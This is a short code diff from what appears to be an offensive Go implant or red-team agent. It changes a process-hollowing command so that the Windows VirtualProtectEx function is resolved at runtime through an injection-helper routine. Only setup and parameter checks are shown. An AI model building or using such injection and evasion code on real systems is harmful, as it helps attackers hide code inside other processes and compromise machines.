@@ -29,10 +29,14 @@ type hollowParams struct {
 	BlockDLLs    bool   `json:"block_dlls"`
 }
 
-// procVirtualProtectExHollow avoids conflict with procVirtualProtectX in helpers
-var procVirtualProtectExHollow = kernel32.NewProc("VirtualProtectEx")
+// procVirtualProtectExHollow — resolved at runtime via ensureInjectionHelpers
+var procVirtualProtectExHollow *syscall.LazyProc
 
 func (c *HollowingCommand) Execute(task structs.Task) structs.CommandResult {
+	ensureInjectionHelpers()
+	if procVirtualProtectExHollow == nil {
+		procVirtualProtectExHollow = procVirtualProtectX
+	}
 	if task.Params == "" {
 		return errorResult("Error: parameters required")
 	}
